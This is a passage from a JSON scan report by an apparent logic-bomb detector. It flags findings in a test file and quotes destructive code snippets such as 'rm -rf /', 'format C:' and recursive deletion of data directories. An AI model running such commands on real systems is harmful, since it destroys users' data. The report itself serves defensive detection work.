      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.888722"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_data')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:03.026717",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "7932d025-573a-4a4e-b283-8820c4e9c40b",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:03.026717"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('format C:')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:03.030720",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "ed15a7cb-f805-47c1-b3fa-807c1bc404f1",
      "last_modified": "",
      "line_number": 13,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "System formatting - Complete data destruction",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:03.030720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:03.032720",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "7b186ef0-1bf4-4dad-9bd5-87fe56c87497",
      "last_modified": "",
      "line_number": 14,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:03.032720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical_file.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:03.033721",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "4451cccd-ebe4-4c31-9791-ff1920cd8816",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:03.033721"
    }
  ],
  "issues_found": 49,
  "project_id": "vscode-workspace-1754923982488",
  "quality_gate_status": "BLOCKED",
  "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
  "timestamp": "2025-08-11T20:23:02.509721",
  "lines_of_code": 0,
  "coverage": "100%",
  "logic_bomb_risk_score": 0,
  "threat_shield_status": "BLOCKED"
}